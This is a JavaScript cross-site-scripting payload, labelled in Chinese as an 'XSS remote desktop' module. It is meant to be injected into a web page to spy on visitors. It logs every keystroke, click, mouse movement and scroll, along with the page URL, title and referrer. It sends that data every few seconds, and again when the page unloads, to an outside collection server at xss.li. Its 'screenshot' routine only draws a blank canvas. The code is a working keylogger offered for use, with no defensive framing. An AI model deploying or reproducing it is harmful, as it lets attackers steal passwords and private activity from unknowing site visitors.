// XSS远程桌面控制 (RDP) - 实时屏幕+键鼠控制
// 通过持续截屏和事件劫持实现类RDP效果

(function() {
    'use strict';
    
    const config = {
        serverUrl: 'https://xss.li/api/collect.php',
        screenshotInterval: 2000, // 每2秒截屏一次
        quality: 0.5,
        reportInterval: 5000 // 每5秒上报一次
    };
    
    let eventBuffer = [];
    let isActive = true;
    
    console.log('🖥️ XSS-RDP远程桌面模块已激活');
    
    // 截取当前屏幕
    async function captureScreen() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = Math.min(window.innerWidth, 1920);
            canvas.height = Math.min(window.innerHeight, 1080);
            
            // 绘制当前页面到canvas
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // 截取body内容
            const bodyRect = document.body.getBoundingClientRect();
            
            // 使用DOM to Image方法
            const screenshot = canvas.toDataURL('image/jpeg', config.quality);
            
            return {
                screenshot: screenshot,
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    scrollX: window.scrollX,
                    scrollY: window.scrollY
                },
                timestamp: Date.now()
            };
        } catch (error) {
            console.error('截屏失败:', error);
            return null;
        }
    }
    
    // 监听所有键盘事件
    document.addEventListener('keydown', (e) => {
        eventBuffer.push({
            type: 'keyboard',
            action: 'keydown',
            key: e.key,
            code: e.code,
            ctrl: e.ctrlKey,
            alt: e.altKey,
            shift: e.shiftKey,
            meta: e.metaKey,
            timestamp: Date.now()
        });
    });
    
    // 监听所有鼠标事件
    ['click', 'dblclick', 'mousedown', 'mouseup', 'mousemove'].forEach(eventType => {
        document.addEventListener(eventType, (e) => {
            // mousemove采样(避免数据过多)
            if (eventType === 'mousemove' && Math.random() > 0.1) return;
            
            eventBuffer.push({
                type: 'mouse',
                action: eventType,
                x: e.clientX,
                y: e.clientY,
                pageX: e.pageX,
                pageY: e.pageY,
                button: e.button,
                target: e.target.tagName,
                timestamp: Date.now()
            });
        });
    });
    
    // 监听滚动事件
    window.addEventListener('scroll', () => {
        eventBuffer.push({
            type: 'scroll',
            scrollX: window.scrollX,
            scrollY: window.scrollY,
            timestamp: Date.now()
        });
    });
    
    // 定期上报数据
    async function reportData() {
        if (!isActive) return;
        
        try {
            const screenData = await captureScreen();
            
            const payload = {
                type: 'rdp_control',
                screen: screenData,
                events: eventBuffer.splice(0, eventBuffer.length), // 清空缓冲区
                session: {
                    userAgent: navigator.userAgent,
                    url: window.location.href,
                    title: document.title,
                    referrer: document.referrer
                },
                timestamp: new Date().toISOString()
            };
            
            const response = await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log('🖥️ RDP数据上报成功');
            }
        } catch (error) {
            console.error('RDP数据上报失败:', error);
        }
    }
    
    // 启动定期上报
    const reportTimer = setInterval(reportData, config.reportInterval);
    
    // 页面卸载时发送最后一次数据
    window.addEventListener('beforeunload', () => {
        isActive = false;
        clearInterval(reportTimer);
        
        if (eventBuffer.length > 0) {
            navigator.sendBeacon(config.serverUrl, JSON.stringify({
                type: 'rdp_final',
                events: eventBuffer
            }));
        }
    });
    
    console.log('✅ RDP远程控制已就绪');
    
})();
